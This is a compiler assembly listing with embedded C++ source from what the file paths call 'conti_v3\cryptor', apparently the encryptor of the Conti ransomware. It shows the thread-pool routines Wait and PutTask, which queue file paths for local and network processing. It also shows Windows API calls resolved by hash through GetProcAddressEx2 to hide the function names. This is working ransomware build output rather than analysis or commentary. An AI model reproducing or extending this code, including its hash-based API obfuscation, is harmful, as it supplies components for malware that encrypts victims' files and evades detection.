  00000	40 53		 push	 rbx
  00002	41 57		 push	 r15
  00004	48 83 ec 38	 sub	 rsp, 56			; 00000038H
  00008	8b d9		 mov	 ebx, ecx

; 254  : 	PTHREADPOOL_INFO ThreadPoolInfo = NULL;
; 255  : 	if (ThreadPoolID == threadpool::LOCAL_THREADPOOL) {

  0000a	85 c9		 test	 ecx, ecx
  0000c	75 09		 jne	 SHORT $LN5@Wait

; 256  : 		ThreadPoolInfo = &g_LocalThreadPool;

  0000e	4c 8d 3d 00 00
	00 00		 lea	 r15, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A ; g_LocalThreadPool

; 257  : 	}

  00015	eb 10		 jmp	 SHORT $LN8@Wait
$LN5@Wait:

; 258  : 	else if (ThreadPoolID == threadpool::NETWORK_THREADPOOL) {

  00017	83 fb 01	 cmp	 ebx, 1
  0001a	0f 85 35 01 00
	00		 jne	 $LN7@Wait

; 259  : 		ThreadPoolInfo = &g_NetworkThreadPool;

  00020	4c 8d 3d 00 00
	00 00		 lea	 r15, OFFSET FLAT:?g_NetworkThreadPool@@3Uthreadpool_info@@A ; g_NetworkThreadPool
$LN8@Wait:
  00027	48 89 74 24 58	 mov	 QWORD PTR [rsp+88], rsi

; 265  : 	for (SIZE_T i = 0; i < ThreadPoolInfo->ThreadsCount; i++) {

  0002c	33 c0		 xor	 eax, eax
  0002e	48 89 7c 24 60	 mov	 QWORD PTR [rsp+96], rdi
  00033	8b f0		 mov	 esi, eax
  00035	49 8b 7f 08	 mov	 rdi, QWORD PTR [r15+8]
  00039	48 85 ff	 test	 rdi, rdi
  0003c	0f 84 df 00 00
	00		 je	 $LN3@Wait
  00042	4c 89 64 24 30	 mov	 QWORD PTR [rsp+48], r12
  00047	4c 8d 25 18 00
	00 00		 lea	 r12, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A+24
  0004e	4c 89 6c 24 28	 mov	 QWORD PTR [rsp+40], r13
  00053	4c 8d 2d 48 00
	00 00		 lea	 r13, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A+72
  0005a	48 89 6c 24 50	 mov	 QWORD PTR [rsp+80], rbp
  0005f	4c 89 74 24 20	 mov	 QWORD PTR [rsp+32], r14
$LL4@Wait:

; 209  : 	if (ThreadPoolID == threadpool::LOCAL_THREADPOOL) {

  00064	85 db		 test	 ebx, ebx
  00066	75 08		 jne	 SHORT $LN14@Wait

; 210  : 		ThreadPoolInfo = &g_LocalThreadPool;

  00068	49 8b ec	 mov	 rbp, r12
  0006b	4d 8b f5	 mov	 r14, r13

; 211  : 	}

  0006e	eb 17		 jmp	 SHORT $LN17@Wait
$LN14@Wait:

; 212  : 	else if (ThreadPoolID == threadpool::NETWORK_THREADPOOL) {

  00070	83 fb 01	 cmp	 ebx, 1
  00073	0f 85 82 00 00
	00		 jne	 $LN2@Wait

; 213  : 		ThreadPoolInfo = &g_NetworkThreadPool;

  00079	48 8d 2d 18 00
	00 00		 lea	 rbp, OFFSET FLAT:?g_NetworkThreadPool@@3Uthreadpool_info@@A+24
  00080	4c 8d 35 48 00
	00 00		 lea	 r14, OFFSET FLAT:?g_NetworkThreadPool@@3Uthreadpool_info@@A+72
$LN17@Wait:

; 214  : 	}
; 215  : 	else {
; 216  : 		return FALSE;
; 217  : 	}
; 218  : 
; 219  : 	PTASK_INFO Task = new TASK_INFO;

  00087	b9 38 00 00 00	 mov	 ecx, 56			; 00000038H
  0008c	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  00091	48 8b f8	 mov	 rdi, rax
  00094	0f 57 c0	 xorps	 xmm0, xmm0
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 396  : 	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));

  00097	41 b8 49 37 2c
	4f		 mov	 r8d, 1328297801		; 4f2c3749H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  0009d	0f 11 00	 movups	 XMMWORD PTR [rax], xmm0

; 2648 :         _My_data._Mysize = 0;

  000a0	33 c0		 xor	 eax, eax

; 2649 :         _My_data._Myres  = _Small_string_capacity;

  000a2	48 c7 47 18 07
	00 00 00	 mov	 QWORD PTR [rdi+24], 7
  000aa	48 89 47 10	 mov	 QWORD PTR [rdi+16], rax

; 2650 :         _My_data._Activate_SSO_buffer();
; 2651 : 
; 2652 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 2653 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  000ae	66 89 07	 mov	 WORD PTR [rdi], ax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 227  : 	Task->Stop = TRUE;

  000b1	c7 47 20 01 00
	00 00		 mov	 DWORD PTR [rdi+32], 1
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 396  : 	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));

  000b8	8d 50 0f	 lea	 edx, QWORD PTR [rax+15]
  000bb	44 8d 48 4c	 lea	 r9d, QWORD PTR [rax+76]
  000bf	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 397  : 	return pFunction(lpCriticalSection);

  000c4	48 8b cd	 mov	 rcx, rbp
  000c7	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 229  : 	TAILQ_INSERT_TAIL(&ThreadPoolInfo->TaskList, Task, Entries);

  000c9	48 8d 57 28	 lea	 rdx, QWORD PTR [rdi+40]
  000cd	33 c0		 xor	 eax, eax
  000cf	48 89 02	 mov	 QWORD PTR [rdx], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  000d2	41 b8 84 08 2c
	99		 mov	 r8d, -1725167484	; 992c0884H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 229  : 	TAILQ_INSERT_TAIL(&ThreadPoolInfo->TaskList, Task, Entries);

  000d8	49 8b 06	 mov	 rax, QWORD PTR [r14]
  000db	48 89 47 30	 mov	 QWORD PTR [rdi+48], rax
  000df	49 8b 06	 mov	 rax, QWORD PTR [r14]
  000e2	48 89 38	 mov	 QWORD PTR [rax], rdi
  000e5	49 89 16	 mov	 QWORD PTR [r14], rdx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  000e8	ba 0f 00 00 00	 mov	 edx, 15
  000ed	44 8d 4a 3b	 lea	 r9d, QWORD PTR [rdx+59]
  000f1	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 415  : 	return pFunction(lpCriticalSection);

  000f6	48 8b cd	 mov	 rcx, rbp
  000f9	ff d0		 call	 rax
$LN2@Wait:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 265  : 	for (SIZE_T i = 0; i < ThreadPoolInfo->ThreadsCount; i++) {

  000fb	49 8b 47 08	 mov	 rax, QWORD PTR [r15+8]
  000ff	48 ff c6	 inc	 rsi
  00102	48 3b f0	 cmp	 rsi, rax
  00105	0f 82 59 ff ff
	ff		 jb	 $LL4@Wait
  0010b	4c 8b 74 24 20	 mov	 r14, QWORD PTR [rsp+32]
  00110	8b f8		 mov	 edi, eax
  00112	4c 8b 6c 24 28	 mov	 r13, QWORD PTR [rsp+40]
  00117	4c 8b 64 24 30	 mov	 r12, QWORD PTR [rsp+48]
  0011c	48 8b 6c 24 50	 mov	 rbp, QWORD PTR [rsp+80]
$LN3@Wait:

; 266  : 		PutFinalTask(ThreadPoolID);
; 267  : 	}
; 268  : 
; 269  : 	pWaitForMultipleObjects(ThreadPoolInfo->ThreadsCount, ThreadPoolInfo->hThreads, TRUE, INFINITE);

  00121	49 8b 1f	 mov	 rbx, QWORD PTR [r15]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 577  : 	pFunction = (DWORD(WINAPI*)(DWORD, const HANDLE*, BOOL, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x78b61591, 58);//GetProcAddress(hKernel32, OBFA("WaitForMultipleObjects"));

  00124	ba 0f 00 00 00	 mov	 edx, 15
  00129	41 b8 91 15 b6
	78		 mov	 r8d, 2025198993		; 78b61591H
  0012f	44 8d 4a 2b	 lea	 r9d, QWORD PTR [rdx+43]
  00133	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 578  : 	return pFunction(nCount, lpHandles, bWaitAll, dwMilliseconds);

  00138	41 b9 ff ff ff
	ff		 mov	 r9d, -1			; ffffffffH
  0013e	41 b8 01 00 00
	00		 mov	 r8d, 1
  00144	48 8b d3	 mov	 rdx, rbx
  00147	8b cf		 mov	 ecx, edi
  00149	ff d0		 call	 rax
  0014b	48 8b 7c 24 60	 mov	 rdi, QWORD PTR [rsp+96]
  00150	48 8b 74 24 58	 mov	 rsi, QWORD PTR [rsp+88]
$LN7@Wait:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 270  : }

  00155	48 83 c4 38	 add	 rsp, 56			; 00000038H
  00159	41 5f		 pop	 r15
  0015b	5b		 pop	 rbx
  0015c	c3		 ret	 0
?Wait@threadpool@@YAXH@Z ENDP				; threadpool::Wait
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
;	COMDAT ?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
_TEXT	SEGMENT
ThreadPoolID$ = 80
Path$ = 88
?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z PROC ; threadpool::PutTask, COMDAT

; 174  : {

$LN152:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	41 54		 push	 r12
  00005	41 57		 push	 r15
  00007	48 83 ec 28	 sub	 rsp, 40			; 00000028H
  0000b	48 8b fa	 mov	 rdi, rdx

; 175  : 	PTHREADPOOL_INFO ThreadPoolInfo = NULL;
; 176  : 	if (ThreadPoolID == threadpool::LOCAL_THREADPOOL) {

  0000e	85 c9		 test	 ecx, ecx
  00010	75 10		 jne	 SHORT $LN5@PutTask

; 177  : 		ThreadPoolInfo = &g_LocalThreadPool;

  00012	4c 8d 25 18 00
	00 00		 lea	 r12, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A+24
  00019	4c 8d 3d 48 00
	00 00		 lea	 r15, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A+72

; 178  : 	}

  00020	eb 17		 jmp	 SHORT $LN8@PutTask
$LN5@PutTask:

; 179  : 	else if (ThreadPoolID == threadpool::NETWORK_THREADPOOL) {

  00022	83 f9 01	 cmp	 ecx, 1
  00025	0f 85 2d 01 00
	00		 jne	 $LN7@PutTask

; 180  : 		ThreadPoolInfo = &g_NetworkThreadPool;

  0002b	4c 8d 25 18 00
	00 00		 lea	 r12, OFFSET FLAT:?g_NetworkThreadPool@@3Uthreadpool_info@@A+24
  00032	4c 8d 3d 48 00
	00 00		 lea	 r15, OFFSET FLAT:?g_NetworkThreadPool@@3Uthreadpool_info@@A+72
$LN8@PutTask:

; 186  : 	PTASK_INFO Task = new TASK_INFO;

  00039	b9 38 00 00 00	 mov	 ecx, 56			; 00000038H
  0003e	48 89 74 24 60	 mov	 QWORD PTR [rsp+96], rsi
  00043	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2648 :         _My_data._Mysize = 0;

  00048	33 ed		 xor	 ebp, ebp
  0004a	0f 57 c0	 xorps	 xmm0, xmm0
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 186  : 	PTASK_INFO Task = new TASK_INFO;

  0004d	48 8b f0	 mov	 rsi, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00050	0f 11 00	 movups	 XMMWORD PTR [rax], xmm0

; 2648 :         _My_data._Mysize = 0;

  00053	48 89 68 10	 mov	 QWORD PTR [rax+16], rbp

; 2649 :         _My_data._Myres  = _Small_string_capacity;

  00057	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 2650 :         _My_data._Activate_SSO_buffer();
; 2651 : 
; 2652 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 2653 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  0005f	66 89 28	 mov	 WORD PTR [rax], bp

; 3189 :         if (this == _STD addressof(_Right)) {

  00062	48 3b c7	 cmp	 rax, rdi
  00065	74 5d		 je	 SHORT $LN92@PutTask

; 2244 :         return _Myres > _Small_string_capacity;

  00067	48 83 7f 18 07	 cmp	 QWORD PTR [rdi+24], 7

; 2235 :         const value_type* _Result = _Bx._Buf;

  0006c	4c 8b cf	 mov	 r9, rdi

; 2236 :         if (_Large_mode_engaged()) {

  0006f	76 03		 jbe	 SHORT $LN135@PutTask

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  00071	4c 8b 0f	 mov	 r9, QWORD PTR [rdi]
$LN135@PutTask:

; 3228 :         assign(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  00074	48 8b 57 10	 mov	 rdx, QWORD PTR [rdi+16]

; 3412 :         if (_Count <= _Mypair._Myval2._Myres) {

  00078	48 83 fa 07	 cmp	 rdx, 7
  0007c	77 3e		 ja	 SHORT $LN93@PutTask

; 2244 :         return _Myres > _Small_string_capacity;

  0007e	48 83 78 18 07	 cmp	 QWORD PTR [rax+24], 7

; 3412 :         if (_Count <= _Mypair._Myval2._Myres) {

  00083	48 89 5c 24 50	 mov	 QWORD PTR [rsp+80], rbx
  00088	4c 89 74 24 20	 mov	 QWORD PTR [rsp+32], r14

; 2226 :         value_type* _Result = _Bx._Buf;

  0008d	4c 8b f6	 mov	 r14, rsi

; 2227 :         if (_Large_mode_engaged()) {

  00090	76 03		 jbe	 SHORT $LN96@PutTask

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

  00092	4c 8b 30	 mov	 r14, QWORD PTR [rax]
$LN96@PutTask:

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  00095	48 8d 1c 12	 lea	 rbx, QWORD PTR [rdx+rdx]

; 3415 :             _Mypair._Myval2._Mysize = _Count;

  00099	48 89 50 10	 mov	 QWORD PTR [rax+16], rdx

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  0009d	4c 8b c3	 mov	 r8, rbx
  000a0	49 8b d1	 mov	 rdx, r9
  000a3	49 8b ce	 mov	 rcx, r14
  000a6	e8 00 00 00 00	 call	 memmove

; 3417 :             _Traits::assign(_Old_ptr[_Count], _Elem());

  000ab	66 42 89 2c 33	 mov	 WORD PTR [rbx+r14], bp
  000b0	4c 8b 74 24 20	 mov	 r14, QWORD PTR [rsp+32]
  000b5	48 8b 5c 24 50	 mov	 rbx, QWORD PTR [rsp+80]

; 3418 :             _ASAN_STRING_CREATE(*this);
; 3419 :             return *this;

  000ba	eb 08		 jmp	 SHORT $LN92@PutTask
$LN93@PutTask:

; 3420 :         }
; 3421 : 
; 3422 :         return _Reallocate_for(

  000bc	48 8b ce	 mov	 rcx, rsi
  000bf	e8 00 00 00 00	 call	 ??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
$LN92@PutTask:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 396  : 	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));

  000c4	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 195  : 	Task->Stop = FALSE;

  000c9	89 6e 20	 mov	 DWORD PTR [rsi+32], ebp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 396  : 	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));

  000cc	41 b8 49 37 2c
	4f		 mov	 r8d, 1328297801		; 4f2c3749H
  000d2	44 8d 4a 3d	 lea	 r9d, QWORD PTR [rdx+61]
  000d6	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 397  : 	return pFunction(lpCriticalSection);

  000db	49 8b cc	 mov	 rcx, r12
  000de	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 198  : 	TAILQ_INSERT_TAIL(&ThreadPoolInfo->TaskList, Task, Entries);

  000e0	48 89 6e 28	 mov	 QWORD PTR [rsi+40], rbp
  000e4	4c 8d 46 28	 lea	 r8, QWORD PTR [rsi+40]
  000e8	49 8b 07	 mov	 rax, QWORD PTR [r15]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  000eb	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 198  : 	TAILQ_INSERT_TAIL(&ThreadPoolInfo->TaskList, Task, Entries);

  000f0	48 89 46 30	 mov	 QWORD PTR [rsi+48], rax
  000f4	49 8b 07	 mov	 rax, QWORD PTR [r15]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  000f7	44 8d 4a 3b	 lea	 r9d, QWORD PTR [rdx+59]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 198  : 	TAILQ_INSERT_TAIL(&ThreadPoolInfo->TaskList, Task, Entries);

  000fb	48 89 30	 mov	 QWORD PTR [rax], rsi
  000fe	4d 89 07	 mov	 QWORD PTR [r15], r8
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  00101	41 b8 84 08 2c
	99		 mov	 r8d, -1725167484	; 992c0884H
  00107	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 415  : 	return pFunction(lpCriticalSection);

  0010c	49 8b cc	 mov	 rcx, r12
  0010f	ff d0		 call	 rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00111	48 8b 57 18	 mov	 rdx, QWORD PTR [rdi+24]
  00115	48 8b 74 24 60	 mov	 rsi, QWORD PTR [rsp+96]
  0011a	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  0011e	76 31		 jbe	 SHORT $LN130@PutTask
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00120	48 8b 0f	 mov	 rcx, QWORD PTR [rdi]
  00123	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0012b	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  00132	72 18		 jb	 SHORT $LN129@PutTask

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00134	4c 8b 41 f8	 mov	 r8, QWORD PTR [rcx-8]
  00138	48 83 c2 27	 add	 rdx, 39			; 00000027H

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  0013c	49 2b c8	 sub	 rcx, r8

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0013f	48 8d 41 f8	 lea	 rax, QWORD PTR [rcx-8]
  00143	48 83 f8 1f	 cmp	 rax, 31
  00147	77 68		 ja	 SHORT $LN33@PutTask

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  00149	49 8b c8	 mov	 rcx, r8
$LN129@PutTask:

; 268  :         ::operator delete(_Ptr, _Bytes);

  0014c	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN130@PutTask:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 200  : 	return TRUE;

  00151	b8 01 00 00 00	 mov	 eax, 1
  00156	eb 3f		 jmp	 SHORT $LN149@PutTask
$LN7@PutTask:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00158	48 8b 52 18	 mov	 rdx, QWORD PTR [rdx+24]
  0015c	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  00160	76 31		 jbe	 SHORT $LN37@PutTask
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00162	48 8b 0f	 mov	 rcx, QWORD PTR [rdi]
  00165	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0016d	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  00174	72 18		 jb	 SHORT $LN36@PutTask

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00176	4c 8b 41 f8	 mov	 r8, QWORD PTR [rcx-8]
  0017a	48 83 c2 27	 add	 rdx, 39			; 00000027H

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  0017e	49 2b c8	 sub	 rcx, r8

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00181	48 8d 41 f8	 lea	 rax, QWORD PTR [rcx-8]
  00185	48 83 f8 1f	 cmp	 rax, 31
  00189	77 26		 ja	 SHORT $LN33@PutTask

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  0018b	49 8b c8	 mov	 rcx, r8
$LN36@PutTask:

; 268  :         ::operator delete(_Ptr, _Bytes);

  0018e	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN37@PutTask:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4873 :         _My_data._Mysize = 0;

  00193	33 ed		 xor	 ebp, ebp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 183  : 		return FALSE;

  00195	33 c0		 xor	 eax, eax
$LN149@PutTask:

; 201  : }

  00197	66 89 2f	 mov	 WORD PTR [rdi], bp
  0019a	48 c7 47 18 07
	00 00 00	 mov	 QWORD PTR [rdi+24], 7
  001a2	48 89 6f 10	 mov	 QWORD PTR [rdi+16], rbp
  001a6	48 83 c4 28	 add	 rsp, 40			; 00000028H
  001aa	41 5f		 pop	 r15
  001ac	41 5c		 pop	 r12
  001ae	5f		 pop	 rdi
  001af	5d		 pop	 rbp
  001b0	c3		 ret	 0
$LN33@PutTask:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  001b1	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  001b6	cc		 int	 3
$LN148@PutTask:
